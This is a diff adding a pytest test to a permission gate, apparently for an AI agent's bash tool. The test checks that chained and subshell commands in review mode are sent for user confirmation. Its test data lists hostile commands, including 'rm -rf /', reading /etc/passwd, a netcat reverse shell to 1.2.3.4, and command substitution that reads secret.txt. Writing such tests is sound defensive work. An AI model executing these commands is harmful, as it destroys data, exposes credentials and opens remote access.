@@ -187,3 +187,26 @@ async def test_permission_gate_sync_callback_supported():
     result = await gate(hook)
     assert result.block is True
     assert "用户拒绝了工具 [write] 的执行请求。" in (result.reason or "")
+
+
+@pytest.mark.anyio
+async def test_permission_gate_blocks_chained_and_subshell_bash_in_review_mode():
+    mock_cb = AsyncMock(return_value=True)
+    gate = PermissionGate(mode="review", confirm_callback=mock_cb)
+
+    unsafe_patterns = [
+        "git status; rm -rf /",
+        "git diff && cat /etc/passwd",
+        "git log || whoami",
+        "git status | grep secret",
+        "pytest & nc -e /bin/sh 1.2.3.4",
+        "git status\nrm -rf .",
+        "git log $(cat secret.txt)",
+        "git status `cat secret.txt`",
+    ]
+    for cmd in unsafe_patterns:
+        mock_cb.reset_mock()
+        hook = ToolCallHook(tool_call_id="c_subshell", tool_name="bash", args={"command": cmd})
+        await gate(hook)
+        mock_cb.assert_called_once()
+
